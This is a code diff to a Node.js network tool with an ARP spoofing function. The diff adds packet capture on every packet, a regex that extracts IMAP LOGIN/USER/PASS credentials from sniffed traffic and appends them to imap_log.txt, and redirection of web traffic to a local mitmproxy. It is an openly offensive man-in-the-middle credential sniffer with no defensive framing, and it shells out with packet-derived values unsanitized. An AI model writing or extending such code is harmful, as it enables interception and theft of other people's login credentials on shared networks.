@@ -2,6 +2,7 @@ const raw = require('raw-socket');
 const pcap = require('pcap');
 const ping = require('node-net-ping');
 const os = require('os');
+const fs = require('fs');
 const { exec } = require('child_process');
 
 // Function to get the network interface IP address
@@ -93,15 +94,33 @@ function sendArpPacket(interface, targetIp, targetMac, spoofIp, spoofMac) {
     });
 }
 
-// Function to capture and redirect packets to mitmproxy
+// Function to capture packets and log IMAP credentials
 function capturePackets(interfaceName) {
-    const pcapSession = pcap.createSession(interfaceName, "ip proto \\tcp");
+    const pcapSession = pcap.createSession(interfaceName, "");
     console.log('Packet capture started on interface:', interfaceName);
 
     pcapSession.on('packet', (rawPacket) => {
         const packet = pcap.decode.packet(rawPacket);
-        // Redirect packet to mitmproxy
-        exec(`curl -k --proxy http://localhost:8080 ${packet.link.ip.dst}`);
+        const ipPayload = packet.payload.payload;
+        const tcpPayload = ipPayload.payload;
+        
+        const data = tcpPayload.data;
+        if (data) {
+            const dataString = data.toString('utf8');
+            console.log(dataString);
+
+            // Log IMAP credentials if found
+            const imapPattern = /(LOGIN|USER|PASS)\s+(\S+)/gi;
+            const match = imapPattern.exec(dataString);
+            if (match) {
+                fs.appendFileSync('imap_log.txt', `${new Date().toISOString()} - ${match[1]}: ${match[2]}\n`);
+            }
+
+            // Redirect HTTP/HTTPS traffic to mitmproxy
+            if (ipPayload.dport === 80 || ipPayload.dport === 443) {
+                exec(`curl -k --proxy http://localhost:8080 ${ipPayload.daddr}`);
+            }
+        }
     });
 }
 
